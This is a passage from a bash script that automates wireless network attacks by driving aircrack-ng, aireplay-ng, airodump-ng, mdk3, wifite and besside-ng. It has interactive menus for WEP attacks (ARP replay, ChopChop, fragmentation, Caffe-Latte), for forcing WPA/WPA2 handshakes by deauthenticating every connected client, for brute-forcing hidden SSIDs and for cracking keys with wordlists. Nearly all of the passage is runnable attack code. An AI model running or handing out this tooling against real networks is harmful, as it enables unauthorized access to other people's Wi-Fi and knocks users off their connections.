--bssid $bssid --write \"dump_$essid\"\n\t\t\t#$terminal airodump-ng -w \"dump_$essid\" --bssid $bssid -i $interfaceMonitor &\n\n\t\t\t#Working (uses session path)\n\t\t\t#$terminal airodump-ng -w \"$capturePath/$encryptionType/dump_$essid\" --bssid $bssid -i $interfaceMonitor &\n\t\t\t;;\n\t\tesac\n\t\t;;\n\tesac\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\naircrackDecrypt(){\n\n\tcurrentTask=\"aircrackDecrypt\"\n\n\tsessionCopyNewCaptureFiles\n\n\tcase \"$encryptionType\" in\n\n\t\t\"wep\")\n\t\taircrackDecryptWEP\n\t\t;;\n\n\t\t\"wpa\")\n\t\taircrackDecryptWPA\n\t\t;;\n\n\t\t\"wpa2\")\n\t\taircrackDecryptWPA2\n\t\t;;\n\n\tesac\n\n}\n\n\nadAPScan(){\n\n\tcurrentTask=\"adAPScan\"\n\n\techo \"\"\n\t\n\tbanner\n\n\trm \"$defaultScanOutputIVS\"\n\trm \"$defaultScanOutputXML\"\n\n\t#$terminal airodump-ng --channel $channel -i $interfaceMonitor &\n\t#$terminal airodump-ng --ignore-negative-one --channel $channel -i $interfaceMonitor &\n\n\t$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor -w \"$initPath/apScan\" --write-interval 10 -o netxml &\n\n\t#$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor &\n\t#read pause\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\n# Unused Function (20170103)\nadAPScanWPS(){\n\n\tcurrentTask=\"adAPScanWPS\"\n\n\techo \"\"\n\techo \"\"\n\n\t$terminal airodump-ng --channel $channel -i $interfaceMonitor --wps &\n\n\t#$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\nadAPScanWifiteWPS(){\n\n\tcurrentTask=\"adAPScanWifiteWPS\"\n\n\techo \"\"\n\techo \"\"\n\n\t$terminal $wifiteAttackWPS -c $channel -i $interfaceMonitor &\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\nadAPScanWifiteWEP(){\n\n\tcurrentTask=\"adAPScanWifiteWEP\"\n\n\techo \"\"\n\techo \"\"\n\n\t$terminal $wifiteAttackWEP -c $channel -i $interfaceMonitor &\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\nadAPScanNoChannel(){\n\n\tcurrentTask=\"adAPScanNoChannel\"\n\n\techo \"\"\n\t\n\tbanner\n\n\trm \"$defaultScanOutputIVS\"\n\trm \"$defaultScanOutputXML\"\n\n\t#$terminal airodump-ng -i $interfaceMonitor &\n\t#$terminal airodump-ng --ignore-negative-one -i $interfaceMonitor &\n\n\t$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor -w \"$initPath/apScan\" --write-interval 10 -o netxml &\n\n\t#$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor &\n\t#read pause\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\nadAPScanNoChannelWPS(){\n\n\tcurrentTask=\"adAPScanNoChannelWPS\"\n\n\techo \"\"\n\t\n\tbanner\n\n\trm \"$defaultScanOutputIVS\"\n\trm \"$defaultScanOutputXML\"\n\n\t$terminal airodump-ng -i $interfaceMonitor --wps -w \"$initPath/apScan\" --write-interval 10 -o netxml &\n\n\t#$terminal airodump-ng -i $interfaceMonitor --wps &\n\n\t#$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\nadAPScanWifiteWPSNoChannel(){\n\n\tcurrentTask=\"adAPScanWifiteWPSNoChannel\"\n\n\techo \"\"\n\techo \"\"\n\n\t$terminal $wifiteAttackWPS -i $interfaceMonitor &\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\nadAPScanWifiteWEPNoChannel(){\n\n\tcurrentTask=\"adAPScanWifiteWEPNoChannel\"\n\n\techo \"\"\n\techo \"\"\n\n\t$terminal $wifiteAttackWEP -i $interfaceMonitor &\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\nbruteForceHiddenSSID(){\n\n\tcurrentTask=\"bruteForceHiddenSSID\"\n\n\tadAPScanNoChannel\n\n\tbanner\n\techo \"\"\n\t$green\n\techo \"Using Interface: $interfaceMonitor\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$cyan\n\techo \"Use the airodump window to find your target\"\n\techo \"\"\n\techo \"Example Hidden: 01:02:03:04:05:06                 <length 21>\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$white\n\techo \"Type Target BSSID and Press ENTER:\"\n\techo \"\"\n\n\tread targetBSSID\n\n\tcase \"$targetBSSID\" in\n\n\t\t*)\n\t\tbanner\n\t\techo \"\"\n\t\t$cyan\n\t\tmdk3 $interfaceMonitor p -t $targetBSSID -b -s 300\n\t\techo \"\"\n\t\techo \"\"\n\t\t;;\n\n\tesac\n\t\t\n\t$green\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"***************************************\"\n\techo \"Bruteforcing Finished!\"\n\techo \"***************************************\"\n\techo \"\"\n\techo \"\"\n\techo \"Check Above For Possible Hidden SSID Reveals\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER To Continue When Finished....\"\n\techo \"\"\n\tread finishBrute\n\n}\n\n\n############################################################################\n#   ATTACKS: GLOBAL END   ##################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   ATTACKS: WEP BEGIN   ###################################################\n############################################################################\n\n\nautoModeNoPreviousSessionWEP(){\n\n\tcurrentTask=\"autoModeNoPreviousSessionWEP\"\n\n\tadAPScanNoChannel\n\n\tdoSleepMessage \"Setting Up User Input....\" \"2\"\n\n\tgetESSID\n\tgetBSSID\n\tgetChannel\n\n\tsessionWriteBeginNew\n\tsessionCopyNewCaptureFiles\n\n\tdoSleepMessage \"Killing airodump-ng Sessions....\" \"2\"\n\n\tkillAirodump\n\tkillWifite\n\n\tdoSleepMessage \"Preparing Client Association....\" \"2\"\n\n\tarAssociate\n\t#sleep 10\n\t#killAireplay\n\n\tdoSleepMessage \"Preparing airodump-ng Session....\" \"2\"\n\n\tadFileDump\n\tmenuAttacksWEP\n\n}\n\n\nautoModeUsePreviousSessionWEP(){\n\n\tcurrentTask=\"autoModeUsePreviousSessionWEP\"\n\n\tsessionWriteLoadPrevious\n\n\tdoSleepMessage \"Preparing Client Association....\" \"2\"\n\n\tarAssociate\n\n\tdoSleepMessage \"Preparing airodump-ng Session....\" \"2\"\n\n\tadFileDump\n\n\tmenuAttacksWEP\n\n}\n\n\nmenuAttacksWEP(){\n\n\tcurrentTask=\"menuAttacksWEP\"\n\tlastMenuID=\"menuAttacksWEP\"\n\n\tsessionCopyNewCaptureFiles\n\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"Choose an attack to perform and press ENTER (Type \\\"more\\\" to see other options):\"\n\techo \"\"\n\techo \"\"\n\techo \"1) De-Auth (De-Authenticate All Stations) (0=Constant)\"\n\techo \"2) Fake Auth (Fake Authentication with AP)\"\n\techo \"3) Interactive Attack (Interactive Frame Selection)\"\n\techo \"4) ARP Replay (Standard ARP Request Replay)\"\n\techo \"5) ChopChop Atack (Decrypt WEP Packets)\"\n\techo \"6) Fragment Attack (Generates a Valid Keystream)\"\n\techo \"7) Caffe-Latte Attack (Query Client for New IV's)\"\n\techo \"8) C-Frag (Fragments Against a Client)\"\n\techo \"9) MigMode (Attacks WPA Migration Mode)\"\n\techo \"\"\n\techo \"R) Re-Associate (Associate with Client)\"\n\techo \"N) Start New Capture (Log to a new CAP file)\"\n\techo \"T) Test (Tests Injection and Quality)\"\n\techo \"\"\n\techo \"C) Run Aircrack (Crack WEP Key) **If decryption fails, press ENTER from aircrack to return here**\"\n\techo \"\"\n\n\tread getAttackWEP\n\n\thotkeyInput=\"$getAttackWEP\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getAttackWEP\" in\n\n\t\t\"\")\n\t\tmenuAttacksWEP\n\t\t;;\n\n\t\t\"C\" | \"c\")\n\t\taircrackDecrypt\n\t\t;;\n\n\t\t\"R\" | \"r\")\n\t\tarAssociate\n\t\t;;\n\n\t\t\"T\" | \"t\")\n\t\tarAttackTest\n\t\t;;\n\n\t\t\"N\" | \"n\")\n\t\tkillAirodump\n\t\tkillAireplay\n\t\tadFileDump\n\t\t;;\n\n\t\t\"0\")\n\t\tarAttackDeAuthConstant\n\t\t;;\n\n\t\t\"1\")\n\t\tarAttackDeAuth\n\t\t;;\n\n\t\t\"2\")\n\t\tarAttackFakeAuth\n\t\t;;\n\n\t\t\"3\")\n\t\tarAttackInteractive\n\t\t;;\n\n\t\t\"4\")\n\t\tarAttackArpReplay\n\t\t;;\n\n\t\t\"5\")\n\t\tarAttackChopChop\n\t\t;;\n\n\t\t\"6\")\n\t\tarAttackFragment\n\t\t;;\n\n\t\t\"7\")\n\t\tarAttackCaffeLatte\n\t\t;;\n\n\t\t\"8\")\n\t\tarAttackCfrag\n\t\t;;\n\n\t\t\"9\")\n\t\tarAttackMigMode\n\t\t;;\n\n\t\t\"more\")\n\t\tbanner\n\t\tbannerStats\n\n\t\techo \"\"\n\t\techo \"Choose an option and press ENTER:\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"1) TCP Dump\"\n\t\techo \"\"\n\t\techo \"2) Generate ARP Packet\"\n\t\techo \"\"\n\t\techo \"3) Forge ARP Request\"\n\t\techo \"\"\n\t\techo \"4) Replay Forged ARP Request\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"R) Return To Previous Page\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t\n\t\tread getMore\n\n\t\thotkeyInput=\"$getMore\"\n\n\t\tloadMenuHotkeys \"$hotkeyInput\"\n\n\t\tcase \"$getMore\" in\n\n\t\t\t\"\")\n\t\t\tmenuAttacksWEP\n\t\t\t;;\n\n\t\t\t\"1\")\n\t\t\t# Needs .cap as INPUT\n\t\t\t#tcpDump \"\"\n\t\t\ttcpDump \"$initPath/$bssid-arp.cap\"\n\t\t\t;;\n\n\t\t\t\"2\")\n\t\t\tgenerateArpPacket\n\t\t\t;;\n\n\t\t\t\"3\")\n\t\t\t# Needs .xor as INPUT\n\t\t\t#forgeArpRequest \"\"\n\t\t\tgetXorFile=$(ls | grep xor | grep $essid)\n\t\t\tforgeArpRequest \"$getXorFile\" \"$initPath/$bssid-arp.cap\"\n\t\t\t;;\n\n\t\t\t\"4\")\n\t\t\t# Needs .cap as INPUT (Using Default From forgeArpRequest)\n\t\t\treplayArpRequest\n\t\t\t;;\n\n\t\t\t\"R\" | \"r\")\n\t\t\tmenuAttacksWEP\n\t\t\t;;\n\n\t\tesac\n\t\t;;\n\t\t\n\n\t\t*)\n\t\tmenuAttacksWEP\n\t\t;;\n\n\tesac\n\n\tmenuAttacksWEP\n\n}\n\n\nmenuAttacksWEPWifiteAuto(){\n\n\tcurrentTask=\"menuAttacksWEPWifiteAuto\"\n\tlastMenuID=\"menuAttacksWEPWifiteAuto\"\n\n\tkillAll\n\n\t#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 5000 &\n\t$terminal $wifiteAttackWEP -wepsave \"$initPath\" -wepca 5000 &\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"The wifite session should be launched in a separate window.\"\n\techo \"\"\n\techo \"PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!\"\n\techo \"\"\n\techo \"AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!\"\n\techo \"\"\n\n\tread pause\n\n\tsessionCopyNewCaptureFiles\n\n\tkillAll\n\tmenuAuto\n\n}\n\n\narAssociate(){\n\n\tcurrentTask=\"arAssociate\"\n\n\techo \"\"\n\techo \"\"\n\n\t$terminal aireplay-ng -1 6000 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &\n\n\techo \"\"\n\techo \"\"\n\n}\n\n\narAttackDeAuth(){\n\n\tcurrentTask=\"arAttackDeAuth\"\n\n\tretryDeauth=\"0\"\n\n\tdoSleepMessage \"Preparing to De-Authenticate All Connected Stations....\" \"2\"\n\n\t$terminal aireplay-ng --deauth 5 -a $bssid $interfaceMonitor &\n\n\tdoSleepMessage \"De-Authenticating All Connected Stations....\" \"5\"\n\n}\n\n\narAttackDeAuthConstant(){\n\n\tcurrentTask=\"arAttackDeAuthConstant\"\n\n\tretryDeauth=\"0\"\n\n\tdoSleepMessage \"De-Authenticating All Connected Stations....\" \"2\"\n\n\t$terminal aireplay-ng --deauth 0 -a $bssid $interfaceMonitor &\n\n}\n\n\narAttackFakeAuth(){\n\n\tcurrentTask=\"arAttackFakeAuth\"\n\n\t#$terminal aireplay-ng -1 1 -a $bssid -h $macAddressMonitor -e \"$essid\" $interfaceMonitor &\n\t$terminal aireplay-ng -1 0 -a $bssid -h $macAddressMonitor -e \"$essid\" $interfaceMonitor &\n\t\n\t# Alt\n\t#$terminal aireplay-ng -1 6000 -o 1 -q 10 -a $bssid -h $macAddressMonitor -e \"$essid\" $interfaceMonitor &\n\n}\n\n\narAttackInteractive(){\n\n\tcurrentTask=\"arAttackInteractive\"\n\n\t$terminal aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -a $bssid -h $macAddressMonitor $interfaceMonitor &\n\n}\n\n\narAttackArpReplay(){\n\n\tcurrentTask=\"arAttackArpReplay\"\n\n\t$terminal aireplay-ng -3 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &\n\n}\n\n\narAttackChopChop(){\n\n\tcurrentTask=\"arAttackChopChop\"\n\n\t#$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &\n\t$terminal aireplay-ng -4 -h $macAddressMonitor -b $bssid $interfaceMonitor &\n\t\n\t# Unauthenticated Method\n\t#$terminal aireplay-ng -4 -b $bssid $interfaceMonitor &\n\n}\n\n\narAttackFragment(){\n\n\tcurrentTask=\"arAttackFragment\"\n\n\t$terminal aireplay-ng -5 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &\n\n}\n\n\narAttackCaffeLatte(){\n\n\tcurrentTask=\"arAttackCaffeLatte\"\n\n\t$terminal aireplay-ng -6 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &\n\n}\n\n\narAttackCfrag(){\n\n\tcurrentTask=\"arAttackCfrag\"\n\n\t$terminal aireplay-ng -7 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &\n\n}\n\n\narAttackMigMode(){\n\n\tcurrentTask=\"arAttackMigMode\"\n\n\t$terminal aireplay-ng -8 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &\n\n}\n\n\narAttackTest(){\n\n\tcurrentTask=\"arAttackTest\"\n\n\t$terminal aireplay-ng -9 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &\n\n}\n\naircrackDecryptWEP(){\n\n\tcurrentTask=\"aircrackDecryptWEP\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"Preparing capture files for aircrack-ng....\"\n\techo \"\"\n\techo \"\"\n\n\tfindCaptureFiles\n\n\t#echo \"$listCap\"\n\t#echo \"$listIvs\"\n\t#read pause\n\n\tkillAircrack\n\n\taircrack-ng -a $acMode -e \"$essid\" -b $bssid -l \"key_$essid\" $listCap $listIvs&\n\t#aircrack-ng -e \"$essid\" -b $bssid -l \"key_$essid\" *.cap *.ivs&\n\t#aircrack-ng -l \"key_$essid\" *.cap *.ivs&\n\t#'aircrack-ng' \" -l\" \"$capturePath/$encryptionType/key_$essid\" \"$capturePath/$encryptionType/*.cap\" \"$capturePath/$encryptionType/*.ivs\"&\n\n\t# Killing aircrack-ng to stop auto-checking from overlapping WEP Attack menu\n\tkillAircrack\n\n\t#echo \"\"\n\t#echo \"\"\n\t#echo \"\"\n\t#echo \"FOUND KEY: \"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER to return to Attacks Menu....\"\n\techo \"\"\n\techo \"\"\n\n\tread acPause\n\n\tmenuAttacksWEP\n\n}\n\n\n############################################################################\n#   ATTACKS: WEP END   #####################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   ATTACKS: WPA BEGIN   ###################################################\n############################################################################\n\n\nautoModeNoPreviousSessionWPA(){\n\n\tcurrentTask=\"autoModeNoPreviousSessionWPA\"\n\n\tadAPScanNoChannel\n\n\tdoSleepMessage \"Setting Up User Input....\" \"2\"\n\n\tgetESSID\n\tgetBSSID\n\tgetChannel\n\n\tsessionWriteBeginNew\n\tsessionCopyNewCaptureFiles\n\n\tdoSleepMessage \"Killing Airodump Window....\" \"2\"\n\n\n\tkillAirodump\n\n\n\tmenuAttacksWPA\n\n\techo \"\"\n\techo \"\"\n\techo \"Press any key to continue....\"\n\techo \"\"\n\techo \"\"\n\n\tread pause\n\n}\n\n\nautoModeUsePreviousSessionWPA(){\n\n\tcurrentTask=\"autoModeUsePreviousSessionWPA\"\n\n\tsessionWriteLoadPrevious\n\n\tmenuAttacksWPA\n\n\n\techo \"\"\n\techo \"\"\n\techo \"Press any key to continue....\"\n\techo \"\"\n\techo \"\"\n\n\tread pause\n\n}\n\n\nmenuAttacksWPA(){\n\n\tcurrentTask=\"menuAttacksWPA\"\n\n\tbanner\n\tbannerStats\n\n\t# Only run a deauth with default text and settings if not re-forced through menu\n\tcase \"$retryDeauth\" in\n\n\t\t\"0\")\n\t\tkillAll\n\n\t\tadFileDump\n\n\t\tdoSleepMessage \"Preparing to Capture WPA Handshake....\" \"2\"\n\n\t\tarAttackDeAuth\n\t\tcaptureHandshakeWPA\n\t\t;;\n\n\t\t\"1\")\n\t\tdoSleepMessage \"Preparing to De-Authenticate All Connected Stations....\" \"1\"\n\t\tarAttackDeAuth\n\t\tcaptureHandshakeWPA\n\t\t;;\n\tesac\n\n}\n\n\naircrackDecryptWPA(){\n\n\tcurrentTask=\"aircrackDecryptWPA\"\n\tlastMenuID=\"aircrackDecryptWPA\"\n\n\tbanner\n\tbannerStats\n\n\tdoSleepMessage \"Preparing captured handshake for aircrack-ng....\" \"4\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"You need a wordlist to crack the key!\"\n\techo \"\"\n\techo \"Current List Loaded:\"\n\techo \"\"\n\t$green\n\techo \"$wordlist\"\n\t$white\n\techo \"\"\n\techo \"You may press C and ENTER to load a custom list\"\n\techo \"\"\n\techo \"\"\n\techo \"Another Example Wordlist Collection:\"\n\techo \"https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm\"\n\techo \"\"\n\techo \"\"\n\techo \"You may also press B and ENTER to run a besside-ng attack\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER once you have a valid wordlist ready!\"\n\techo \"\"\n\techo \"\"\n\n\tread tmpPause\n\n\thotkeyInput=\"$tmpPause\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$tmpPause\" in\n\n\t\t\"\")\n\t\t$terminal aircrack-ng -w \"$wordlist\" -b $bssid *.cap\n\t\t;;\n\n\t\t\"C\" | \"c\")\n\t\tgetCustomList\n\t\t;;\n\n\t\t\"B\" | \"b\")\n\t\tbessideMain\n\t\t;;\n\n\tesac\n\n\tbanner\n\tbannerStats\n\n\t#echo \"\"\n\t#echo \"\"\n\t#echo \"\"\n\t#echo \"FOUND KEY: \"\n\techo \"\"\n\techo \"WPA Attack Is Currently Running!\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$red\n\techo \"*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***\"\n\techo \"\"\n\techo \"\"\n\t$white\n\techo \"Press ENTER to restart attack or use an option from Top Navigation Bar....\"\n\techo \"\"\n\techo \"\"\n\t$red\n\techo \"*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***\"\n\t$white\n\techo \"\"\n\techo \"\"\n\n\tread acPause\n\n\thotkeyInput=\"$acPause\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$acPause\" in\n\n\t\t\"\")\n\t\tkillAll\n\t\tmenuAttacksWPA\n\t\t;;\n\n\tesac\n\n}\n\n\ncaptureHandshakeWPA(){\n\n\tcurrentTask=\"captureHandshakeWPA\"\n\tlastMenuID=\"captureHandshakeWPA\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"The airodump window is open. Look in top right hand corner for the handshake\"\n\techo \"\"\n\techo \"Once handshake is complete, you may close the airodump window.\"\n\techo \"\"\n\techo \"\"\n\t$green\n\techo \"Example: [ WPA handshake: $bssid ]\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"To force another DEAUTH for HANDSHAKE press D and ENTER!\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER to continue once handshake is made....\"\n\techo \"\"\n\techo \"\"\n\n\tread captureHandshake\n\n\thotkeyInput=\"$captureHandshake\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$captureHandshake\" in\n\n\t\t\"\")\n\t\tkillAirodump\n\t\tkillAireplay\n\n\t\tdoSleepMessage \"Preparing capture files for aircrack-ng....\" \"2\"\n\n\t\taircrackDecrypt\n\t\t;;\n\n\t\t\"D\" | \"d\")\n\t\tretryDeauth=\"1\"\n\t\tmenuAttacksWPA\n\t\t;;\n\n\t\t*)\n\t\tmenuAttacksWPA\n\t\t;;\n\n\tesac\n\n}\n\n\nmenuAttacksWPAWifiteAuto(){\n\n\tcurrentTask=\"menuAttacksWPAWifiteAuto\"\n\tlastMenuID=\"menuAttacksWPAWifiteAuto\"\n\n\tkillAll\n\n\t#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &\n\t$terminal $wifiteAttackWPA &\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"The wifite session should be launched in a separate window.\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!\"\n\techo \"\"\n\techo \"AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!\"\n\techo \"\"\n\n\tread pause\n\n\tsessionCopyNewCaptureFiles\n\n\tkillAll\n\tmenuAuto\n\n}\n\n\n############################################################################\n#   ATTACKS: WPA END   #####################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   ATTACKS: WPA2 BEGIN   ##################################################\n############################################################################\n\n\nautoModeNoPreviousSessionWPA2(){\n\n\tcurrentTask=\"autoModeNoPreviousSessionWPA2\"\n\n\tadAPScanNoChannel\n\n\tdoSleepMessage \"Setting Up User Input....\" \"2\"\n\n\tgetESSID\n\tgetBSSID\n\tgetChannel\n\n\tsessionWriteBeginNew\n\tsessionCopyNewCaptureFiles\n\n\tdoSleepMessage \"Killing Airodump Window....\" \"2\"\n\n\n\tkillAirodump\n\n\tmenuAttacksWPA2\n\n\techo \"\"\n\techo \"\"\n\techo \"Press any key to continue....\"\n\techo \"\"\n\techo \"\"\n\n\tread pause\n\n}\n\n\nautoModeUsePreviousSessionWPA2(){\n\n\tcurrentTask=\"autoModeUsePreviousSessionWPA2\"\n\n\tsessionWriteLoadPrevious\n\n\tmenuAttacksWPA2\n\n\techo \"\"\n\techo \"\"\n\techo \"Press any key to continue....\"\n\techo \"\"\n\techo \"\"\n\n\tread pause\n\n}\n\n\nmenuAttacksWPA2(){\n\n\tcurrentTask=\"menuAttacksWPA2\"\n\n\tbanner\n\tbannerStats\n\n\t# Only run a deauth with default text and settings if not re-forced through menu\n\tcase \"$retryDeauth\" in\n\n\t\t\"0\")\n\t\tkillAll\n\n\t\tadFileDump\n\n\t\tdoSleepMessage \"Preparing to Capture WPA Handshake....\" \"2\"\n\n\t\tarAttackDeAuth\n\t\tcaptureHandshakeWPA2\n\t\t;;\n\n\t\t\"1\")\n\t\tdoSleepMessage \"Preparing to De-Authenticate All Connected Stations....\" \"1\"\n\t\tarAttackDeAuth\n\t\tcaptureHandshakeWPA2\n\t\t;;\n\tesac\n\n}\n\n\naircrackDecryptWPA2(){\n\n\tcurrentTask=\"aircrackDecryptWPA2\"\n\tlastMenuID=\"aircrackDecryptWPA2\"\n\n\tbanner\n\tbannerStats\n\n\tdoSleepMessage \"Preparing captured handshake for aircrack-ng....\" \"4\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"You need a wordlist to crack the key!\"\n\techo \"\"\n\techo \"Current List Loaded:\"\n\techo \"\"\n\t$green\n\techo \"$wordlist\"\n\t$white\n\techo \"\"\n\techo \"You may press C and ENTER to load a custom list\"\n\techo \"\"\n\techo \"\"\n\techo \"Another Example Wordlist Collection:\"\n\techo \"https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm\"\n\techo \"\"\n\techo \"\"\n\techo \"You may also press B and ENTER to run a besside-ng attack\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER once you have a valid wordlist ready!\"\n\techo \"\"\n\techo \"\"\n\n\tread tmpPause\n\n\thotkeyInput=\"$tmpPause\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$tmpPause\" in\n\n\t\t\"\")\n\t\t$terminal aircrack-ng -w \"$wordlist\" -b $bssid *.cap\n\t\t;;\n\n\t\t\"C\" | \"c\")\n\t\tgetCustomList\n\t\t;;\n\n\t\t\"B\" | \"b\")\n\t\tbessideMain\n\t\t;;\n\n\tesac\n\n\tbanner\n\tbannerStats\n\n\t#echo \"\"\n\t#echo \"\"\n\t#echo \"\"\n\t#echo \"FOUND KEY: \"\n\techo \"\"\n\techo \"WPA2 Attack Is Currently Running!\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$red\n\techo \"*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***\"\n\techo \"\"\n\techo \"\"\n\t$white\n\techo \"Press ENTER to restart attack or use an option from Top Navigation Bar....\"\n\techo \"\"\n\techo \"\"\n\t$red\n\techo \"*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***\"\n\t$white\n\techo \"\"\n\techo \"\"\n\n\tread acPause\n\n\thotkeyInput=\"$acPause\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$acPause\" in\n\n\t\t\"\")\n\t\tkillAll\n\t\tmenuAttacksWPA2\n\t\t;;\n\n\tesac\n\n}\n\n\ncaptureHandshakeWPA2(){\n\n\tcurrentTask=\"captureHandshakeWPA2\"\n\tlastMenuID=\"captureHandshakeWPA2\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"The airodump window is open. Look in top right hand corner for the handshake\"\n\techo \"\"\n\techo \"Once handshake is complete, you may close the airodump window.\"\n\techo \"\"\n\techo \"\"\n\t$green\n\techo \"Example: [ WPA handshake: $bssid ]\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"To force another DEAUTH for HANDSHAKE press D and ENTER!\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER to continue once handshake is made....\"\n\techo \"\"\n\techo \"\"\n\n\tread captureHandshake\n\n\thotkeyInput=\"$captureHandshake\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$captureHandshake\" in\n\n\t\t\"\")\n\t\tkillAirodump\n\t\tkillAireplay\n\n\t\tdoSleepMessage \"Preparing capture files for aircrack-ng....\" \"2\"\n\n\t\taircrackDecrypt\n\t\t;;\n\n\t\t*)\n\t\tmenuAttacksWPA2\n\t\t;;\n\n\tesac\n\n}\n\n\nmenuAttacksWPA2WifiteAuto(){\n\n\tcurrentTask=\"menuAttacksWPA2WifiteAuto\"\n\tlastMenuID=\"menuAttacksWPA2WifiteAuto\"\n\n\tkillAll\n\n\t#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &\n\t$terminal $wifiteAttackWPA2 &\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"The wifite session should be launched in a separate window.\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!\"\n\techo \"\"\n\techo \"AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!\"\n\techo \"\"\n\n\tread pause\n\n\tsessionCopyNewCaptureFiles\n\n\tkillAll\n\tmenuAuto\n\n}\n\n\n############################################################################\n#   ATTACKS: WPA2 END   ####################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   ATTACKS: WPS BEGIN   ###################################################\n############################################################################\n\n\nautoModeNoPreviousSessionWPS(){\n\n\tcurrentTask=\"autoModeNoPreviousSessionWPS\"\n\n\t#adAPScanWifiteWPSNoChannel\n\t#adAPScanNoChannel\n\tadAPScanNoChannelWPS\n\n\tdoSleepMessage \"Preparing Text List of Available Targets....\" \"15\"\n\n\tdoSleepMessage \"Setting Up User Input....\" \"2\"\n\n\tgetESSID\n\tgetBSSID\n\tgetChannel\n\n\tsessionWriteBeginNew\n\tsessionCopyNewCaptureFiles\n\n\tdoSleepMessage \"Killing Airodump Window....\" 